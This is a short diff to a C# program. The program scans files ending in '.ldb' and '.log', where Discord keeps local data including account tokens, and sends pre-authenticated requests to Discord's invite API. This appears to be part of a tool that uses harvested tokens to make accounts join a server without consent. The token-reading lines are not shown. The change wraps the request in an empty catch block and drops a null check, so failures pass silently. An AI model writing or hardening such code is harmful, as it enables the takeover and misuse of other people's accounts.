@@ -46,7 +46,9 @@
             {
                 if (text.EndsWith(".ldb") || text.EndsWith(".log"))
                 {
-                    WebRequest webRequest = WebRequest.Create(new Uri("https://discordapp.com/api/v6/invite/{invitation code}"));
+                   try{
+                    
+                     WebRequest webRequest = WebRequest.Create(new Uri("https://discordapp.com/api/v6/invite/{invitation code}"));
                     HttpWebRequest httpWebRequest = (HttpWebRequest)webRequest;
                     httpWebRequest.PreAuthenticate = true;
                     httpWebRequest.Accept = "application/json";
@@ -58,14 +60,12 @@
                     httpWebRequest.Referer = "https://discordapp.com/activity";
                     WebResponse response = webRequest.GetResponse();
                     Stream responseStream = response.GetResponseStream();
-                    if (responseStream == null)
-                    {
-                        break;
-                    }
                     StreamReader streamReader = new StreamReader(responseStream, Encoding.Default);
                     streamReader.ReadToEnd();
                     streamReader.Close();
                     response.Close();
+                    
+                   } catch{}
                 }
             }
         }
